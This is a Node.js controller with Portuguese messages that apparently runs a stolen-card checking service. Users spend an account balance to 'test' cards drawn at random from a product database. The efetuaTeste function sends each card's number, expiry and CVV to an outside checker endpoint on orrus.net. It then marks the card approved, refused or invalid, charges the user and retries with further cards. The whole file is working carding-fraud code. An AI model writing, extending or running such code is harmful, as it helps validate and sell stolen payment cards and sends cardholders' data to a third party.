const Product = require("../models/Product");
const Purchase = require("../models/Purchase");
const User = require("../models/User");
const axios = require("axios");
const FormData = require("form-data");

class TesteController {
	async test(req, res) {
		const user = await User.findById(req.userId);
		const { ammount } = req.body;

		if (!user) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		if (user.balance < ammount) {
			return res.status(400).json({
				error: "Parece que você não pode fazer isso."
			});
		}

		var funcs = [];
		var count = null;
		for (let index = 0; index < ammount; index++) {
			funcs.push(this.efetuaTeste);
			await new Promise((resolve, reject) =>
				this.efetuaTeste(user, null, resolve, reject)
			)
				.then(() => {
					if (count === ammount) {
						return res.json({
							message: "Teste finalizado com sucesso !"
						});
					}

					count = count + 1;
				})
				.catch(() => {
					return res.status(400).json({
						message:
							"Teste finalizado por falta de cartão no estoque."
					});
				});
		}

		return res.json({
			message: "Teste finalizado com sucesso !"
		});
	}

	async efetuaTeste(user, ccNumber, resolve, reject) {
		const totalCC = await Product.countDocuments({
			status: "Disponivel",
			number: { $ne: ccNumber }
		});
		const randomNumber = Math.floor(Math.random() * totalCC);
		var data = await Product.find({
			status: "Disponivel",
			number: { $ne: ccNumber }
		})
			.limit(1)
			.skip(randomNumber);

		if (data.length === 0) {
			reject();
			return;
		}

		const cc = data[0];

		const infoData = `produto=100&codigoBandeira=${cc.flag}&formaPagamento=1&tentarAutenticar=nao&tipoParcelamento=2&capturarAutomaticamente=false&indicadorAutorizacao=2&cartaoNumero=${cc.number}&mes=${cc.month}&ano=${cc.year}&cartaoCodigoSeguranca=${cc.cvv}`;

		const resultTest = await axios({
			method: "get",
			url: `http://orrus.net/b0yBase/api.php?orrus=${cc.number}|${cc.month}|${cc.year}|${cc.cvv}`
		});
		// console.log(resultTest.data.Retorno);
		var result = resultTest.data.Retorno;

		// if (resultTest.data.includes("Retorno")) {
		// 	result = resultTest.data.replace(`{"Retorno":"`, "");
		// 	result = result.replace(`"}`, "");
		// } else {
		// 	result = "Invalida";
		// }

		result = result.trim();

		console.log(result);

		switch (result) {
			case "Autorizado": {
				await User.update(
					{ _id: user.id },
					{
						$inc: { balance: -1 }
					}
				);

				await Product.findByIdAndUpdate(cc.id, {
					status: "Aprovada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(() => {
					resolve();
					return;
				});

				break;
			}

			case "Nao autorizado": {
				await Product.findByIdAndUpdate(cc.id, {
					status: "Recusada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(async () => {
					await new Promise((resolve1, reject2) =>
						this.efetuaTeste(user, cc.number, resolve1, reject2)
					)
						.then(() => {
							resolve();
							return;
						})
						.catch(() => {
							reject();
							return;
						});
				});
				break;
			}

			case "Invalida": {
				await Product.findByIdAndUpdate(cc.id, {
					status: "Invalidada",
					usedBy: user.id,
					usedDate: Date.now()
				}).then(async () => {
					await new Promise((resolve1, reject2) =>
						this.efetuaTeste(user, cc.number, resolve1, reject2)
					)
						.then(() => {
							resolve();
							return;
						})
						.catch(() => {
							reject();
							return;
						});
				});
				break;
			}
		}
	}
}

module.exports = new TesteController();
